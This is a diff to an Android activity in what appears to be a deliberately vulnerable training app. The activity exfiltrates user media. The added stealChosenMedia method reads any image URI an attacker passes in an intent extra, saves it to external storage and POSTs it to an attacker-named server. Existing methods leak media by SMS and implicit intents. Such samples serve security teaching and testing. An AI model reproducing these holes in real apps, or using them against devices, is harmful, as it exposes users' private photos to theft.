@@ -3,10 +3,10 @@ package oversecured.ovaa.activities;
 import android.app.Activity;
 import android.content.ClipData;
 import android.content.ClipboardManager;
-import android.content.ContentValues;
 import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
+import android.graphics.Bitmap;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.Environment;
@@ -33,11 +33,13 @@ public class MediaTheftActivity extends Activity {
         String directory = intent.getStringExtra("directory");
         String server = intent.getStringExtra("server");
         String phone = intent.getStringExtra("phone");
+        String chosenMedia = intent.getStringExtra("media_uri");
+
+        stealChosenMedia(chosenMedia, server);
 
         ArrayList<Uri> media = collectUserMedia();
         copyToExternalStorage(media);
         copyToControlledDirectory(media, directory);
-        copyToPublicMediaProvider(media);
         uploadMedia(media, server);
         sendMediaViaSms(media, phone);
         shareMediaViaImplicitIntent(media);
@@ -71,6 +73,31 @@ public class MediaTheftActivity extends Activity {
         }
     }
 
+    // The caller names the image it wants: the uri from the extra is what getBitmap reads, so the
+    // media is chosen by the attacker rather than by the app.
+    @SuppressWarnings("deprecation")
+    private void stealChosenMedia(String mediaUri, String server) {
+        if (mediaUri == null) {
+            return;
+        }
+        byte[] bytes;
+        try {
+            Bitmap bitmap = MediaStore.Images.Media.getBitmap(getContentResolver(), Uri.parse(mediaUri));
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+            bitmap.compress(Bitmap.CompressFormat.JPEG, 90, out);
+            bytes = out.toByteArray();
+        } catch (IOException e) {
+            return;
+        }
+
+        File destination = new File(Environment.getExternalStorageDirectory(), "chosen.jpg");
+        try (OutputStream out = new FileOutputStream(destination)) {
+            out.write(bytes);
+        } catch (IOException ignored) {
+        }
+        upload(bytes, server);
+    }
+
     private void copyToExternalStorage(ArrayList<Uri> media) {
         for (Uri uri : media) {
             File destination = new File(Environment.getExternalStorageDirectory(),
@@ -94,38 +121,28 @@ public class MediaTheftActivity extends Activity {
         }
     }
 
-    private void copyToPublicMediaProvider(ArrayList<Uri> media) {
-        for (Uri uri : media) {
-            ContentValues values = new ContentValues();
-            values.put(MediaStore.Images.Media.DISPLAY_NAME, uri.getLastPathSegment());
-            values.put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg");
-            Uri published = getContentResolver().insert(
-                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values);
-            if (published == null) {
-                continue;
-            }
-            try (OutputStream out = getContentResolver().openOutputStream(published)) {
-                out.write(read(uri));
-            } catch (IOException ignored) {
-            }
-        }
-    }
-
     private void uploadMedia(ArrayList<Uri> media, String server) {
         if (server == null) {
             return;
         }
         for (Uri uri : media) {
-            try {
-                HttpURLConnection connection = (HttpURLConnection) new URL(server).openConnection();
-                connection.setRequestMethod("POST");
-                connection.setDoOutput(true);
-                try (OutputStream out = connection.getOutputStream()) {
-                    out.write(read(uri));
-                }
-                connection.getResponseCode();
-            } catch (IOException ignored) {
+            upload(read(uri), server);
+        }
+    }
+
+    private void upload(byte[] payload, String server) {
+        if (server == null) {
+            return;
+        }
+        try {
+            HttpURLConnection connection = (HttpURLConnection) new URL(server).openConnection();
+            connection.setRequestMethod("POST");
+            connection.setDoOutput(true);
+            try (OutputStream out = connection.getOutputStream()) {
+                out.write(payload);
             }
+            connection.getResponseCode();
+        } catch (IOException ignored) {
         }
     }
 
